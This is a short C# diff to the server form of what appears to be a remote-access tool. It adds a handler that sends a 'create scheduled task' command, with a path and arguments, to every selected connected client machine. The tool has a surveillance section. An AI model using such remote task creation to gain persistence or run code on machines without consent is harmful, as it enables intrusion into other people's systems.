@@ -12,6 +12,7 @@ using xServer.Enums;
 using xServer.Core.Helper;
 using xServer.Core.Networking;
 using xServer.Core.Networking.Utilities;
+using xServer.Core.Packets.ServerPackets;
 using xServer.Core.Utilities;
 
 namespace xServer.Forms
@@ -675,6 +676,21 @@ namespace xServer.Forms
             }
         }
 
+        private void createTaskToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            var createTaskFrm = new FrmCreateTask();
+            createTaskFrm.ShowDialog();
+
+            if (createTaskFrm.TaskName == null)
+                return;
+
+            foreach (Client c in GetSelectedClients())
+            {
+                new Core.Packets.ServerPackets.DoCreateTask(createTaskFrm.TaskName, createTaskFrm.TaskPath,
+                    createTaskFrm.TaskArguments).Execute(c);
+            }
+        }
+
         #endregion
 
         #region "Surveillance"
@@ -902,5 +918,6 @@ namespace xServer.Forms
         }
 
         #endregion
+
     }
 }
